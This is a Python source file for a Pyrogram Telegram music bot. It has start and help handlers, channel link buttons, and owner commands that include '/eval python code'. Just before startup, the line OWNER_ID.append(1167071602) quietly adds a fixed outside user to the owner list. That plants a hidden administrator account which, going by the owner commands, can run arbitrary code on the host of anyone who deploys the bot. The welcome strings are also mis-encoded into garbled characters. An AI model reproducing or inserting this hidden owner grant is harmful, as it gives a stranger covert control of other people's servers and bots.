from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
ð Hay [{}](tg://user?id={}),

\n\nI'm ðµ ðððð ððððð ððð [ð¶](https://telegra.ph/file/deb4201942e6cf5ee88ae.mp4)

Powered By ð°@epusthakalaya_botsð°

Send The Name of the Song You Want..
ðð . ```/song Bad Habits```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [
               [
                   InlineKeyboardButton(text="ð£ BOT UPDATES ð£", url="https://t.me/epusthakalaya_bots"),
                   InlineKeyboardButton(text="ð¥ SUPPORT GROUP ð¥", url="https://t.me/epusthakalayabotsupport")
               ],
               
               [
                   InlineKeyboardButton(text="ð DEVELOPER ð", url='https://t.me/kasu_bro'),
                   InlineKeyboardButton(text="âï¸ ADD ME âï¸", url="http://t.me/EmmaMusicBot?startgroup=true")
               ],
               
               [
                   InlineKeyboardButton(text="ð REVIEW US ð", url='https://t.me/tlgrmcbot?start=emmamusicbot-review') 
               ],
               
          ]     
    )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Send The Name of the Song You Want..\n /song (song name) "
    await message.reply(text)

OWNER_ID.append(1167071602)
app.start()
LOGGER.info("ðððð ððððð ððð Was Deployed Successfully! â")
idle()
